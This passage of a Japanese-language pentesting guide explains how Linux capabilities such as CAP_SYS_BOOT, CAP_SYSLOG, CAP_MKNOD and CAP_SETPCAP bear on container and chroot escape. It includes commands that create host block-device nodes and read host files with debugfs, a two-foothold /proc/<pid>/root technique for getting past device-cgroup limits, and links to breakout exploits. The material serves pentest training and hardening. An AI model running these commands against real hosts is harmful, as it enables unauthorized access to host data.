これは **chroot-jail escape capability であり、単独で container-to-host escape を可能にするものではありません**。host filesystem を公開したり、その permissions を bypass したりすることはありません。host root がすでに mount されているか、`/proc/<pid>/root` 経由で到達可能な場合、`chroot()` はその既存の tree を process の pathname root にするだけです。また、`setns(2)` による mount namespace の変更には、caller の user namespace における `CAP_SYS_CHROOT` と `CAP_SYS_ADMIN` の両方に加え、target mount namespace を所有する user namespace における `CAP_SYS_ADMIN` が必要です。<sup>[[14]](#references)</sup>

- [さまざまな chroot solutions から break out する方法](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)。<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、`LINUX_REBOOT_CMD_RESTART2` などの command を含む、system restart 用の `reboot(2)` system call の実行を可能にします。また、Linux 3.17 以降では、それぞれ新しい crash kernel または signed crash kernel を load するための `kexec_load(2)` および `kexec_file_load(2)` も有効にします。<sup>[[14]](#references)</sup>

private PID namespace 内では、サポートされている `reboot()` request は host を reboot する代わりに、その namespace の init process を terminate します。したがって、host reboot の影響には initial PID namespace が必要であり、通常は host PID sharing を介します。kexec-based takeover にはさらに、compatible image、利用可能な syscall、そして permissive な lockdown および signature policy が必要です。capability を検証するだけの目的で、shared host 上でいずれかの operation を trigger しないでください：
```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は Linux 2.6.37 で、より広範な **CAP_SYS_ADMIN** から分離され、`syslog(2)` call を使用する権限を明示的に付与するようになりました。この capability により、`kptr_restrict` setting が 1 の場合に、`/proc` や類似の interface を通じて kernel address を確認できます。この setting は kernel address の公開範囲を制御します。Linux 2.6.39 以降、`kptr_restrict` の default は 0 で、kernel address が公開されることを意味します。ただし、多くの distribution では security 上の理由から、1（uid 0 以外には address を隠す）または 2（常に address を隠す）に設定されています。<sup>[[14]](#references)</sup>

さらに、`dmesg_restrict` が 1 に設定されている場合、**CAP_SYSLOG** により `dmesg` output に access できます。これらの変更にもかかわらず、歴史的な経緯により **CAP_SYS_ADMIN** は引き続き `syslog` operations を実行できます。<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、通常の file、FIFO（named pipe）、または UNIX domain socket の作成にとどまらず、`mknod` system call の機能を拡張します。具体的には、以下を含む special file の作成を許可します。<sup>[[14]](#references)</sup>

- **S_IFCHR**: terminal などの device である character special file。
- **S_IFBLK**: disk などの device である block special file。

この capability は、character device や block device を含む device file を作成する必要がある process に有用です。<sup>[[14]](#references)</sup>

これは Docker の documented default capability set に含まれます。すべての deployment が同じ default を使用すると仮定せず、実際の runtime configuration を確認してください（[Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)）。<sup>[[19]](#references)</sup>

container escape では、`CAP_MKNOD` により実際の host device への不足している handle を作成できますが、基盤となる device を作成することはできず、device cgroup を bypass することもできません。完全な chain には以下が必要です。

1. device creation は namespaced ではないため、initial user namespace における Effective `CAP_MKNOD`。
2. 実際の host device に対応する正しい block または character type、および major/minor number。
3. その device を open するための device-cgroup permission。
4. compatible な filesystem-aware reader、または block filesystem を mount するための `CAP_SYS_ADMIN`。
5. node を作成および使用するための filesystem と LSM の permission。

実際の major/minor number が `252:1` である ext-family lab block device の場合、read-only validation は次のとおりです。
```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
番号を`/sys/class/block/<device>/dev`で報告される値に置き換えます。nodeの作成に成功しても、開く際に`Operation not permitted`が返される場合は、device cgroupがアクセスをブロックし続けています。これは、明示的なdevice allowanceなしでDockerのデフォルトの`CAP_MKNOD`だけが付与されたcontainerで通常発生する結果です。

direct container device accessと混同してはならない、独立した**two-foothold local privilege-escalation** techniqueも存在します。initial user namespaceを共有するcontainer内のroot processはblock-device nodeを作成でき、host上のmatching UIDを持つunprivileged shellは、`/proc/<container-pid>/root`経由でそのnodeを開けます。このopenはhost shellのcgroup内で評価されるため、containerのdevice-cgroupによる拒否ではdeviceを保護できなくなります。<sup>[[7]](#references)</sup>

container内でnodeを作成し、既存のhost footholdのUIDでprocessを実行し続けます:
```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
useradd -u "$host_uid" -M htbridge
bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```
その UID を持つ既存の host shell から、sleeping container process の host PID を特定し、その procfs root を device へのパスとして使用します：
```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```
この chain には、両方の foothold、identity-mapped または shared user namespace、対象の `/proc/<pid>/root` を traverse する権限、正しい major/minor 番号を持つ実デバイス、そして open を許可する外側の cgroup が必要です。`hidepid`、ptrace-access のルール、LSM、filesystem の非互換性、または user-namespace remapping によって破綻する可能性があります。この historical technique が価値を持つのは、`/proc/<pid>/root` によって *container の* device-cgroup 制限を bypass できる仕組みを説明するからです。これは、`CAP_MKNOD` だけで通常の分離された container から escape できるという主張ではありません。<sup>[[7]](#references)</sup>

### CAP_SETPCAP

file capabilities がある現在の Linux kernel では、**`CAP_SETPCAP`** により、thread は bounding set から inheritable set に capabilities を追加し、bounding set から capabilities を削除し、securebits を変更できます。プロセスが別のプロセスに任意の capabilities を付与できるわけではありません。その動作が適用されるのは、file-capability のサポートがない pre-2.6.25 kernel のみです。<sup>[[14]](#references)</sup>

`capset()` system call は、thread 自身の effective、permitted、inheritable sets を調整できます。ただし、新しい permitted set に既存の permitted set 外の capabilities を含めることはできず、inheritable の更新も kernel の制約を受けます。<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux capabilities 権限昇格 labs](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Linux の Privilege Escalation](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux Container の基本: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Linux Capabilities の活用](https://www.linuxjournal.com/article/5737)
- [6] [過剰な Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [/proc/pid/root を介した mount namespaces への access の悪用](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: 存在理由と動作の仕組み](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Linux における Capabilities の理解](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [ptrace が許可されている場合に seccomp を bypass する PoC](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [さまざまな chroot ソリューションから escape する方法](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - Sebastian Krahmer による、元祖 CAP_DAC_READ_SEARCH Docker breakout exploit](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Docker breakout exploit の分析](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux マニュアルページ](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux マニュアルページ](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu Manpage](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux マニュアルページ](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [container の実行 - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux マニュアルページ](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux マニュアルページ](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux マニュアルページ](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
